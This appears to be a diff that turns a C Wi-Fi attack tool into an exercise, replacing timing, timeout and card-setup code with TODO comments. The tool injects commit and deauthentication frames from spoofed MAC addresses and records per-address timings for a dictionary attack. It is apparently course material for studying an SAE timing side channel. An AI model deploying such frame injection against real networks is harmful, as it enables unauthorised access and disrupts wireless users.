@@ -163,22 +163,20 @@ static void process_packet(struct state *state, const unsigned char *buf, const 
 		/* Status is good */
 		if (is_status_ok(buf)) {
 			struct timespec diff;
-			calc_prev_commit_diff(state, &diff);
 
-			state->sum_time[state->curraddr] += diff.tv_nsec;
 			state->num_injected[state->curraddr] += 1;
 
+			// Calculate how long the measurement took
+			/* TODO */
+
 			// Write measurement to file
-			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);
+			// For example, measurement of MAC ending with 04 that took 10000 milliseconds:
+			// STA 04: 10000
+			/* TODO */
 
 			// Also provide output to the screen
 			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
 			       state->num_injected[state->curraddr]);
-			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
-				printf("-------------------------------\n");
-				for (int i = 0; i < state->num_addresses; ++i)
-					printf("Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
-			}
 
 			inject_deauth(state);
 
@@ -208,13 +206,8 @@ static void check_timeout(const struct state *state) {
 	if (!state->started_attack)
 		return;
 
-	struct timespec diff;
-	calc_prev_commit_diff(state, &diff);
-
-	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
-		inject_deauth(state);
-		queue_next_commit(state);
-	}
+	// If last commit was before the defined timeout, de-auth and try to commit again
+	/* TODO */
 }
 
 static void print_initial_info(FILE *fp, const struct state *state) {
@@ -229,41 +222,30 @@ static void print_initial_info(FILE *fp, const struct state *state) {
 
 static void event_loop(struct state *state, char *dev) {
 	struct pollfd fds[3];
-	struct itimerspec timespec;
 
-	// 1. Open the card and get the MAC address
-	card_open(state, dev);
-	wi_set_rate(state->wi, USED_RATE);
-	wi_get_mac(state->wi, state->srcaddr);
+	// 1. Open the card, set the rate, and get the MAC address
+	/* TODO */
 
 	// 2. Display all info we need to perform the dictionary attack & also write it to file
 	print_initial_info(stdout, state);
 	print_initial_info(state->fp, state);
 
-	// 3. Initialize further things to start the attack
-	state->srcaddr[5] = state->curraddr;
+	// 3. Set srcaddr to equal the current address
+	/* TODO */
 
-	// 4. Initialize periodic timer to detect timeouts
-	const int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
-	if (timer_fd == -1)
-		perror("timerfd_create()");
-
-	/* initial expiration of the timer */
-	timespec.it_value.tv_sec = 1;
-	timespec.it_value.tv_nsec = 0;
-	/* periodic expiration of the timer */
-	timespec.it_interval.tv_sec = 0;
-	timespec.it_interval.tv_nsec = 100 * 1000 * 1000;
-
-	// 5. Initialize timer used to queue a new commit frame to inject
+	// 4. Create timeout timer, set it to initially expire after 1 second, and periodically expire after 0.1 seconds
+	int timer_fd;
+	struct itimerspec timespec;
+	/* TODO */
 	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
 		perror("timerfd_settime()");
 
-	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
+	// 5. Create commit inject timer
+	/* TODO */
 	if (state->time_fd_inject == -1)
 		perror("timerfd_create()");
 
-	// 6. Now start the main event loop
+	// 6. Start the main event loop
 	printf("Searching for AP ...\n");
 	while (1) {
 		const int card_fd = wi_fd(state->wi);
@@ -282,7 +264,7 @@ static void event_loop(struct state *state, char *dev) {
 		if (fds[0].revents & POLLIN)
 			card_receive(state);
 
-		// This timer is periodically called, detects timeouts, and implicity starts the attack
+		// This timer is periodically called, detects timeouts, and implicitly starts the attack
 		if (fds[1].revents & POLLIN) {
 			uint64_t exp;
 			assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
